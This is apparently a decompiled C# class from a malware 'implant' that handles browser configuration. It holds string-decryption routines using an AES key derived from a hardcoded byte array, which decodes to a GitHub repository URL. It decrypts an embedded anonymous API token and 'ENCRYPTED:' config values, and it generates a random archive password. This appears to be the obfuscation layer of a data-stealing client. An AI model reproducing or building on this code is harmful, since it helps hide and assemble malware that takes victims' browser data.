using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Client.BrowserConfig.Implant
{
	// Token: 0x02000005 RID: 5
	internal sealed class StringsCrypt
	{
		// Token: 0x06000008 RID: 8 RVA: 0x00002754 File Offset: 0x00000954
		public static string GenerateRandomData(string sd = "0")
		{
			bool flag = sd == "0";
			string text;
			if (flag)
			{
				text = new Random().Next(0, 10).ToString();
			}
			else
			{
				text = sd;
			}
			string text2 = "-" + text + "-";
			string text3;
			using (MD5 md = MD5.Create())
			{
				text3 = string.Join("", md.ComputeHash(Encoding.UTF8.GetBytes(text2)).Select(delegate(byte ba)
				{
					byte b = ba;
					return b.ToString("x2");
				}));
			}
			return text3;
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002818 File Offset: 0x00000A18
		public static string Decrypt(byte[] bytesToBeDecrypted)
		{
			byte[] array = null;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
				{
					rijndaelManaged.KeySize = 256;
					rijndaelManaged.BlockSize = 128;
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(StringsCrypt.cryptKey, StringsCrypt.saltBytes, 1000);
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
					rijndaelManaged.Mode = CipherMode.CBC;
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
						cryptoStream.Close();
					}
					array = memoryStream.ToArray();
				}
			}
			return Encoding.UTF8.GetString(array);
		}

		// Token: 0x0600000A RID: 10 RVA: 0x0000293C File Offset: 0x00000B3C
		public static string DecryptConfig(string value)
		{
			bool flag = string.IsNullOrEmpty(value);
			string text;
			if (flag)
			{
				text = "";
			}
			else
			{
				bool flag2 = !value.StartsWith("ENCRYPTED:");
				if (flag2)
				{
					text = value;
				}
				else
				{
					text = StringsCrypt.Decrypt(Convert.FromBase64String(value.Replace("ENCRYPTED:", "")));
				}
			}
			return text;
		}

		// Token: 0x04000011 RID: 17
		public static string ArchivePassword = StringsCrypt.GenerateRandomData("0");

		// Token: 0x04000012 RID: 18
		private static readonly byte[] saltBytes = new byte[]
		{
			byte.MaxValue, 64, 191, 111, 23, 3, 113, 119, 231, 121,
			252, 112, 79, 32, 114, 156
		};

		// Token: 0x04000013 RID: 19
		private static readonly byte[] cryptKey = new byte[]
		{
			104, 116, 116, 112, 115, 58, 47, 47, 103, 105,
			116, 104, 117, 98, 46, 99, 111, 109, 47, 76,
			105, 109, 101, 114, 66, 111, 121, 47, 83, 116,
			111, 114, 109, 75, 105, 116, 116, 121
		};

		// Token: 0x04000014 RID: 20
		public static string github = Encoding.UTF8.GetString(StringsCrypt.cryptKey);

		// Token: 0x04000015 RID: 21
		public static string AnonApiToken = StringsCrypt.Decrypt(new byte[]
		{
			169, 182, 79, 179, 252, 54, 138, 148, 167, 99,
			216, 216, 199, 219, 10, 249, 131, 166, 170, 145,
			237, 248, 142, 78, 196, 137, 101, 62, 142, 107,
			245, 134
		});
	}
}
